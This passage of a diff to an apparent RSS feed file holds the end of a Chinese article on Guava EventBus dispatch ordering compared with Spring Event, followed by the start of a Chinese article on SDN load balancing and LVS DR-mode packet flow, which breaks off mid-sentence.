-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-52IQqykEEJO7AoDK57.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-53QeG3LYWhrKdGo2b.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-53MhCR2MFFuTtTBxU.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-53JTkKEqwnalveOjz.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h4&gt;问题2：dispatcher 分发给订阅者是否有序？&lt;/h4&gt;
-
-&lt;p&gt;&lt;strong&gt;EventBus:同步事件总线&lt;/strong&gt;：&lt;br/&gt;
-同一个事件的多个订阅者，在接收到事件的顺序上面有不同。谁先注册到EventBus的，谁先执行（由于base使用的是PostConstruct进行注册，因此跟不同Bean之间的初始化顺序有关系）。如果是在同一个类中的两个订阅者一起被注册到EventBus的情况，收到事件的顺序跟方法名有关。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;AsyncEventBus:异步事件总线&lt;/strong&gt;：同一个事件的多个订阅者，它们的注册顺序跟接收到事件的顺序上没有任何联系，都会同时收到事件，并且都是在新的线程中，异步并发的执行自己的任务。&lt;/p&gt;
-
-&lt;h4&gt;问题3：EventBus与SpringEvent的对比？&lt;/h4&gt;
-
-
-
-&lt;table&gt;&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;项目&lt;/th&gt;
-&lt;th&gt;事件&lt;/th&gt;
-&lt;th&gt;发布者&lt;/th&gt;
-&lt;th&gt;发布方法&lt;/th&gt;
-&lt;th&gt;是否异步&lt;/th&gt;
-&lt;th&gt;监听者&lt;/th&gt;
-&lt;th&gt;注册方式&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;EventBus&lt;/td&gt;
-&lt;td&gt;任意对象&lt;/td&gt;
-&lt;td&gt;EventBus&lt;/td&gt;
-&lt;td&gt;EventBus#post&lt;/td&gt;
-&lt;td&gt;支持同步异步&lt;/td&gt;
-&lt;td&gt;注解Subscribe方法&lt;/td&gt;
-&lt;td&gt;手动注册EventBus#register&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;SpringEvent&lt;/td&gt;
-&lt;td&gt;任意对象&lt;/td&gt;
-&lt;td&gt;ApplicationEventPublisher&lt;/td&gt;
-&lt;td&gt;ApplicationEventPublisher#publishEvent&lt;/td&gt;
-&lt;td&gt;支持同步异步&lt;/td&gt;
-&lt;td&gt;注解EventListener方法&lt;/td&gt;
-&lt;td&gt;系统注册&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-
-
-
-&lt;table&gt;&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;项目&lt;/th&gt;
-&lt;th&gt;事件区分&lt;/th&gt;
-&lt;th&gt;是否支持事件簇&lt;/th&gt;
-&lt;th&gt;是否支持自定义event&lt;/th&gt;
-&lt;th&gt;是否支持过滤&lt;/th&gt;
-&lt;th&gt;是否支持事件隔离&lt;/th&gt;
-&lt;th&gt;是否支持事务&lt;/th&gt;
-&lt;th&gt;是否支持设置订阅者消费顺序&lt;/th&gt;
-&lt;th&gt;复杂程度&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;EventBus&lt;/td&gt;
-&lt;td&gt;Class&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;td&gt;否&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;td&gt;否&lt;/td&gt;
-&lt;td&gt;否&lt;/td&gt;
-&lt;td&gt;简单&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Spring Event&lt;/td&gt;
-&lt;td&gt;Class&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;td&gt;否&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;td&gt;复杂&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-
-&lt;p&gt;参考链接&lt;a href=&quot;https://www.cnblogs.com/shoren/p/eventBus_springEvent.html&quot;&gt;https://www.cnblogs.com/shoren/p/eventBus_springEvent.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;h4&gt;问题4：EventBus的使用场景，结合现有使用场景考虑是否合适？&lt;/h4&gt;
-
-&lt;p&gt;EventBus暂时不适用，主要有一下几个点:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;EventBus不支持事务，项目在更新、创建商品时，最好等事务提交成功后，再发送MQ消息（主要问题点）&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;EventBus不支持设置同一消息的订阅者消费顺序。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;EventBus不支持消息过滤。SpringEvent支持消息过滤&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1&gt;6.项目中遇到的问题&lt;/h1&gt;
-
-&lt;h2&gt;6.1、问题描述&lt;/h2&gt;
-
-&lt;p&gt;商品上架时会触发渠道分发功能，会有两步操作&lt;/p&gt;
-
-
-
-&lt;p&gt;所以分发会触发两条分发状态不同的商品变更消息，&lt;strong&gt;一条是未分发，另一条是已分发&lt;/strong&gt;。实际发送了两条分发状态相同的商品变更消息，&lt;strong&gt;状态都是已分发&lt;/strong&gt;。&lt;/p&gt;
-
-&lt;h2&gt;6.2、原因&lt;/h2&gt;
-
-&lt;p&gt;我们先来回顾下EventBus 监听者处理事件时有三种策略，这是根本原因：&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;ImmediateDispatcher：来一个事件马上进行处理。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;PerThreadQueuedDispatcher（eventBus默认选项，项目中使用此策略）&lt;/strong&gt;：在同一个线程post的Event,执行的顺序是有序的。用ThreadLocal&lt;queue&gt; queue来实现每个线程post的Event是有序的，在把事件添加到queue后会有一个ThreadLocal dispatching来判断当前线程是否正在分发，如果正在分发，则这次添加的event不会马上进行分发而是等到dispatching的值为false才进行。&lt;/queue&gt;&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;LegacyAsyncDispatcher（AsyncEventBus默认选项）：会有一个全局的队列ConcurrentLinkedQueue queue保存EventWithSubscriber(事件和subscriber),如果被不同的线程poll 不能保证在queue队列中的event是有序发布的。&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;详情可见上文中的【2.3.4、事件分发】&lt;/p&gt;
-
-&lt;p&gt;再看下项目中的逻辑：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;商品自动分发在商品变更的Listener里操作。
-
-由于当前分发操作处于商品上架事件处理过程中，因此对于添加分发记录事件不会立马处理，而是将其放入队列。
-
-上架操作完成，分发状态变为已分发。
-
-等上架操作完成后，商品变更Listener处理分发事件(此时有两条EventMsg，一个是添加分发记录另一个是修改分发状态)，分发状态实时查询，对于第一个分发事件，查询到的分发记录是已分发状态。
-
-最终导致两条消息都是已分发状态。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2&gt;6.3、场景复现&lt;/h2&gt;
-
-&lt;p&gt;在handler中对静态变量进行两次+1 操作，每操作一步发送一条事件，此处假设静态变量为分发状态。&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-540RxH6GrJonnQumZ.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-540y52wuOzKzDrnHD0.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h2&gt;6.4、解决办法&lt;/h2&gt;
-
-&lt;p&gt;目前 Dispatcher 包用default 修饰，使用者无法指定Dispatcher 策略。并且 ImmediateDispatcher 使用private修饰。&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-55bN2K2k29TXyBO6qi.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-553Neic8TdTNhiaYV.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-55RSoMbmTslSC87bm.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;因此目前暂无解决非同步问题，只能在业务逻辑上进行规避。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;其实可以修改源码并发布一个包自己使用，但是公司安全规定不允许这样做，只能通过业务逻辑上进行规避，下图是github上对此问题的讨论。&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-55n3PfPRrhHoYg8Xj.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h1&gt;7、总结&lt;/h1&gt;
-
-&lt;p&gt;如果项目中需要使用异步解耦处理一些事项，使用EventBus还是比较方便的。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.cloudwise.com/cn/page/synmonitoring.html&quot;&gt;点击直达监控宝官网&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;/div&gt;
+  &lt;/div&gt;
   &lt;/div&gt;&lt;/div&gt;</content:encoded>
 </item>
 <item>
-<guid>d5c186ea33f5dec05a19afdedaa2153f</guid>
-<title>使用 SDN 技术替代价值百万人民币的负载均衡硬件（网关、LVS、交换机）</title>
-<link>https://toutiao.io/k/v4yc231</link>
-<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content js_underline_content             autoTypeSetting24psection&amp;#10;            &quot; id=&quot;js_content&quot;&gt;&lt;p&gt;&lt;span&gt;本文共 11000 字，阅读大约需要 40 分钟。&lt;/span&gt;&lt;/p&gt;&lt;hr/&gt;&lt;section&gt;上一篇文章的末尾，我们利用负载均衡器打造了一个五万 QPS 的系统，本篇文章我们就来了解一下负载均衡技术的发展历程，并一起用 SDN（软件定义网络）技术打造出一个能够抗住 200Gbps 的负载均衡集群。&lt;/section&gt;&lt;h2&gt;负载均衡发展史&lt;/h2&gt;&lt;h3&gt;F5 创业史&lt;/h3&gt;&lt;p&gt;1996 年，华盛顿大学的几个学生共同创建了一家生产负载均衡设备的公司，并用美国人民的老朋友——飓风的最高等级 F5 作为品牌名，以表示他们的设备可以抗住最狂暴的网络流量。彼时，互联网的规模每 100 天增长一倍，这也让 F5 在成立三年后火速上市。2001 年，F5 公司在经历了互联网泡沫后，顺利地把设备卖进了银行等大型机构，因为 F5 比微软和甲骨文都更有前瞻性：他们的 iControl 系统可以提供 API，让大型机构自己开发软件来控制通过负载均衡设备的所有流量。&lt;/p&gt;&lt;p&gt;早在 2001 年，软件的威力就已经开始展现。&lt;/p&gt;&lt;h4&gt;TMOS 软件平台&lt;/h4&gt;&lt;p&gt;&lt;span&gt;2003 年非典&lt;/span&gt;暴&lt;span&gt;发，电子商务，网络点餐甚至是网络新闻都迎来了爆发式的增长。&lt;/span&gt;&lt;span&gt;2004 年，F5 上市了新一代产品：&lt;/span&gt;&lt;span&gt;包含 TMOS 软件平台的全套硬件设备，一次性解决了网络访问、数据中心同步访问、远程办公、应用防火墙等多种需求。&lt;/span&gt;&lt;span&gt;此后，市场上 F5 公司的产品越来越具有统治力。&lt;/span&gt;&lt;/p&gt;&lt;h4&gt;迈向应用交付&lt;/h4&gt;&lt;p&gt;2006 年以后，传统的 IP 层负载均衡技术开始向应用层发展，F5 等相关设备厂商也紧跟潮流开始推广“应用交付”的概念，开发了很多结合了负载均衡和应用网关的产品，这之后的十年，是传统负载均衡硬件厂商的最后荣光。&lt;/p&gt;&lt;p&gt;2019 年，F5 Networks 以 6.7 亿美金的价格收购了 Nginx，硬件厂商和软件厂商实现了一次梦幻联动，也侧面说明了我们确实已经迎来了软件定义网络的大时代。&lt;/p&gt;&lt;h4&gt;顺便提一句防火墙&lt;/h4&gt;&lt;p&gt;实际上，在今天的企业网络架构中，专业的网关设备都已经消失，取而代之的是一个看起来不是网络设备的网络设备：防火墙。特别是具备应用识别能力的“下一代防火墙”（没错，就是这个中二的名字），更是将防火墙设备的价值推上了巅峰，并一次性让企业级路由器和中低端负载均衡全部退场，这又是一个软件战胜硬件的故事。&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;一个小八卦，下一代防火墙行业的个中翘楚 Fortinet 公司，由两名出生于北京的清华大学老师的孩子 2000 年在美国创办。&lt;/p&gt;&lt;/blockquote&gt;&lt;h3&gt;负载均衡一代目：硬件负载均衡&lt;/h3&gt;&lt;p&gt;&lt;span&gt;2002 年 2 月，戴尔为 PowerEdge 1650 服务器第一次配上了千兆以太网。当时，负载均衡的主流实现还是基于硬件的，或者说是基于“软硬件一体化解决方案”的。在当时，服务器 CPU 的单核性能还很低，甚至核心数都很少，网卡芯片技术也没有今天这般牛皮（相比于下面&lt;/span&gt;讲&lt;span&gt;的 NPU），所以当时想用运行在标准操作系统(Windows/Linux)内的软件来实现千兆软网关还是一个“前沿探索项目”。&lt;/span&gt;&lt;span&gt;更不要说万兆负载均衡了：&lt;/span&gt;&lt;span&gt;PowerEdge 1650 发布&lt;/span&gt;的&lt;span&gt;四个月后，万兆以太网的标准“IEEE 802.3ae 10 Gb/s 光纤以太网”才首次发布，距离万兆网卡在服务器端普及更是还有十多年的光景。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;不为人知的是，千兆以太网的光纤标准 1998 年才发布，千兆以太网的双绞线标准 1999 年才发布，而到了 2002 年，万兆以太网光纤标准就已经发布了。实际上，千兆以太网在消费端开始普及，也已经是 2010 年的事情了。&lt;/p&gt;&lt;p&gt;21 世纪的头十年，最优秀的超千兆解决方案是：利用二层网络的链路聚合协议，使用多个千兆口同时负载均衡，实现超千兆的速度。而且当时能做到数 G 带宽的负载均衡设备动辄上百万，价格惊人，有需求的终端客户简直就是大冤种，不过在那个移动通信基站都要完全进口的年代，哪个中国人不是大冤种呢。&lt;/p&gt;&lt;p&gt;这些网络硬件厂商，其实都是软件厂商，只不过他们选择将自己的软件装在这些黑色的铁盒子里面卖，这样的产品质量更稳定，更重要的是：这样更贵。相比于买一个看起来可以随意拷贝盗版又虚无缥缈的软件，人类社会落后的官僚体系也更容易接受购买昂贵的实物。具体的技术分析请往下看。&lt;/p&gt;&lt;h3&gt;负载均衡二代目：软件负载均衡&lt;/h3&gt;&lt;p&gt;最近十年，随着云计算的兴起，从硬件设备到 IT 基础设施都发生了翻天覆地的变化，现在，硬件负载均衡已经开始逐步退场：云服务商们使用软件定义网络（SDN）技术，构建出了一个低成本高性能的新世界。&lt;/p&gt;&lt;p&gt;今天，一台总价 3 万元的通用 X86 服务器搭配 100G 以太网卡，使用基于 DPDK 开发的用户态应用程序在 Linux 上发小包，很容易就可以跑满 100Gbps 的网卡带宽¹。&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;1.0822784810126582&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNM7nMMu1Aib6AJLtUdEVZyWssZwuvHvAA4ldpZuxHPKQ3BzBv0tnCdvQ/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;632&quot;/&gt;&lt;/p&gt;&lt;p&gt;这个 tweet 也许有些夸张，但是这就是我们当下的世界：软件正在定义网络的一切。&lt;/p&gt;&lt;h3&gt;价值百万的硬件设备&lt;/h3&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.17342342342342343&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNnDG9QJVDxxU57FGaTwWWq0NdH8vUeqTiaw73vpEAPu1w8qmaAbk2EtA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1776&quot;/&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.7074030552291422&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNjastvibYtGaGicAcy4olbTHaOL4nXppSLs6NBDXNHVdDw3BnhlpUGG7Q/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1702&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;这是一台 F5 生产的售价百万的硬件负载均衡设备，它只用了一颗 4 &lt;/span&gt;核&lt;span&gt; 8 线程的志强 x86 CPU，就实现了 40G 的四层负载均衡能力和 18G 的七层负载均衡（应用网关）能力。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;这台设备内部有两个控制器和四个接口插槽，可以实现“全双活”，即控制流量的“CPU 内存主板”和“网络接口”都是双份，在任意一个资源意外宕机后，另一个备用资源可以无缝顶上，可以实现无丢包的硬件级高可用。同时，这台设备背后的电源适配器应该至少有四个，可以实现运行时热替换，甚至连风扇模组都是冗余的，可热替换的。&lt;/p&gt;&lt;p&gt;下面我们正式开始利用软件的力量，一步一步在标准 x86 服务器上面跑的标准 Linux 系统内，构建出一个和这台硬件负载均衡设备高可用性一致，且带宽可以达到 200G 的负载均衡集群。&lt;/p&gt;&lt;p&gt;让我们先从交换机技术开始讲起。&lt;/p&gt;&lt;h2&gt;交换机&lt;/h2&gt;&lt;p&gt;大家还记得上一篇文章中的负载均衡架构图吗：&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.8775252525252525&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNhJUroSyg5Q4nhQH6jgD0KEhhtud9NCLXMlH6yR9cSJIM2FNatfH5nA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1584&quot;/&gt;&lt;/p&gt;&lt;p&gt;这张图里就暗藏了一个交换机。&lt;/p&gt;&lt;p&gt;左侧，客户端和负载均衡器之间是使用公网 ip 通信的，他们俩是在全球互联网内的两台对等设备，只是数据包经过了很多个真·路由器的“路由”操作，双方才能收到对方发送的数据包。&lt;/p&gt;&lt;p&gt;右侧，负载均衡器和上游服务器通信的时候采用的是内网 ip：&lt;code&gt;10.0.0.100&lt;/code&gt; 和 &lt;code&gt;10.0.0.1&lt;/code&gt;，他们俩是怎么通信的呢？通过交换机。&lt;/p&gt;&lt;h3&gt;路由器和交换机巨大的价格落差&lt;/h3&gt;&lt;p&gt;一台能够跑满千兆 NAT 的路由器，最低价格大概在 300 块，但是一个所有口都能同时跑满全双工千兆（上下行同时跑满千兆）的五口交换机，你知道多少钱吗？39 块钱，包邮。&lt;/p&gt;&lt;p&gt;为什么呢？因为交换机干的事情更为简单，可以用非常低端的芯片满足需求。&lt;/p&gt;&lt;h3&gt;交换机的工作原理&lt;/h3&gt;&lt;p&gt;网关是通过关联两个五元组，再对数据进行修改而发挥作用的。交换机则更简单：只维护一个 MAC 地址在哪个网口上的 HASH 表即可，无需对数据进行任何修改。该表的 key 为 48 位长，value 是个 tinyint：4 口交换机可用 2 bit 表示，8 口交换机可用 3 bit 表示，现在知道为什么家用交换机都是 8 口的了吧。&lt;/p&gt;&lt;p&gt;交换机的工作模式简单表述如下：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;当交换机收到一个 MAC 包时，会查询目的 MAC 地址在哪个网口上&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;若查询不到，交换机会把这个 MAC 包发送到所有口上，包含发来数据包的那个口&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;等到这个 MAC 包被响应，这个 MAC 地址和口的关系就被交换机学习到了，下次就不需要发给所有口了&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;若查询到了，则单独发送到目标网口上&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;全程不会对数据包进行任何修改&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;除了不需要修改数据包之外，交换机也不需要和任何设备通信来建立和更新 MAC 表，只需要监听途径交换机的所有数据包的源 MAC 地址即可。&lt;/p&gt;&lt;h3&gt;交换机技术的优缺点&lt;/h3&gt;&lt;p&gt;优点&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;足够简单，所以硬件成本可以做到足够低&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;不需要和任何设备通信即可支持新设备接入，完全自学习&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;扩展性无敌，交换机可以随便级联，只要 MAC 表容量够，理论上可以插成一颗无限层级的树&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;缺点&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;有网络风暴的风险：数据包被无脑的发到所有口，可能会被别的交换机再发回来，到时候你来我往，跑满线速，造成正常数据包的拥堵&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;网络回环非常恐怖：如果把交换机的两个口用一根线插在一起，那这台交换机会瞬间断网，左右互搏之术对交换机这种低层级设备来说过于困难了&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;当然，现在主流的商用二层交换机已经拥有了很多的三层特性，这些缺点通过各种检测技术都已经解决了。&lt;/p&gt;&lt;h4&gt;大家不要觉得交换机原理没什么用，SDN 是一种跨越了一二三层的技术，MAC 层也是我们构建 200G 负载均衡集群的重要技术战场&lt;/h4&gt;&lt;p&gt;准备工作做完了，下面我们开始搭建负载均衡集群。先从这一切的基础—— LVS 开源软件说起。&lt;/p&gt;&lt;h2&gt;LVS 登场&lt;/h2&gt;&lt;h3&gt;章文嵩创建 IPVS&lt;/h3&gt;&lt;p&gt;1998 年，在章文嵩博士二年级的时候，他发现 Cisco 的硬件负载均衡器要卖几万美金，觉得这玩意儿不难写，于是利用两周的课余时间创建并开源了 LVS（当时叫 IPVS）。时至今日，LVS 技术创造的商业价值已经无法计算，互联网上的绝大部分数据包，都会被 LVS 或者承袭 LVS 思想的软件处理。&lt;/p&gt;&lt;h3&gt;合并进 Linux kernel&lt;/h3&gt;&lt;p&gt;2004 年，LVS（IPVS）被合并进了 kernel 2.4，从此开始，所有 Linux 都拥有了变身为负载均衡器的能力。&lt;/p&gt;&lt;h3&gt;LVS 基本原理&lt;/h3&gt;&lt;p&gt;其实一句话就能说清：通过修改 MAC 层、IP 层、TCP 层的数据包，即实现了一部分交换机和网关的功能，指挥流量到达真正的服务器上。&lt;/p&gt;&lt;p&gt;LVS 有三个常用模式：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;NAT 模式：即网关模式，双向流量均经过网关转发，性能开销最大&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;TUN 模式：类似于单臂路由，性能高且可跨越机房&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;DR 模式：只能用在局域网，但是性能惊人，因为回程流量直接走局域网&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;我们以最能体现 LVS 思想的 DR 模式为例，展示 LVS 的基本原理。&lt;/p&gt;&lt;h3&gt;DR 模式架构图&lt;/h3&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.6046758767268863&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNMicLIKf9icjfeEcPibvuBLfIBqPib09Bxs2FnFIbxDAbV6P4KIqtHBYNEw/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1882&quot;/&gt;&lt;/p&gt;&lt;h3&gt;DR 模式数据包推演&lt;/h3&gt;&lt;p&gt;DR 模式下，LVS 只负责篡改数据包，不负责充当网关，所以我们还是需要一个网关在公网 ip 和私网 ip 之间进行 NAT 转换。我们依然假设客户端 ip 为 123.123.123.123，它发起了一个针对 110.242.68.3 的 80 端口的 HTTP 请求。&lt;/p&gt;&lt;p&gt;当网关接收到一个发送给 110.242.68.3 的数据包时，发现协议为 TCP，目标端口为 80，查询自己的 NAT 表发现内部 ip 为 10.0.0.100（VIP，即虚拟ip），内部端口为 80，于是网关向局域网发出了一个 ip 包。由于端口都是 80 不变，协议都是 TCP 不变，所以本次网络请求中，有四个数据非常关键：源 ip 地址，目的 ip 地址，源 MAC 地址，目的 MAC 地址。&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;客户端发给网关的数据包情况为：&lt;/p&gt;&lt;/li&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;源 ip：123.123.123.123&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 ip：110.242.68.3&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;源 MAC：客户端 MAC&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 MAC：网关 MAC&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;&lt;p&gt;网关向局域网发出的数据包情况为：&lt;/p&gt;&lt;/li&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;源 ip：123.123.123.123&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 ip：10.0.0.100（变了）&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;源 MAC：网关 MAC（变了）&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 MAC：LVS MAC（变了）&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;&lt;p&gt;LVS 接到该数据包后，会选择一个后端服务器，假设它选中的是 10.0.0.1 来真正处理请求，则 LVS 会对数据包进行如下修改后，再发送给 10.0.0.1：&lt;/p&gt;&lt;/li&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;源 ip：123.123.123.123&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 ip：10.0.0.100&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;源 MAC：LVS MAC（变了）&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 MAC：10.0.0.1 的 MAC（变了）&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;&lt;p&gt;10.0.0.1 在收到该数据包后，发现这个包的目的 MAC 地址确实是自己，而且目的 ip 10.0.0.100（VIP）也是自己，于是对该数据包进行正常的处理，然后将处理结果发送出去：&lt;/p&gt;&lt;/li&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;源 ip：10.0.0.100&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 ip：123.123.123.123&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;源 MAC：10.0.0.1 的 MAC&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 MAC：网关 MAC（因为目的 ip 不在“ip+子网掩码”所确定的局域网范围内，所以该数据包会被发送给网关）&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;&lt;p&gt;网关收到返回的数据包后，通过查询“五元组关系表”，对端口和 ip 信息做出正常的 NAT 修改后，将数据包发送回 123.123.123.123，请求结束。&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;大家可以看出 DR 模式的特点：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;LVS 只需要处理正向数据包，通常正向数据包（请求）要远小于反向数据包（响应），所以带宽占用较低&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;反向数据包走的是标准的二层以太网，每台上游服务器都可以跑满自己的线速&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;只能在同一个二层网络下工作（即同一个局域网），且安全性较差&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;需要在每一台上游服务器上都将该 VIP（10.0.0.100）配置为 lo（本地回环）接口的 ip&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;需要让每一台上游服务器都只响应真实 ip 如 10.0.0.1 的 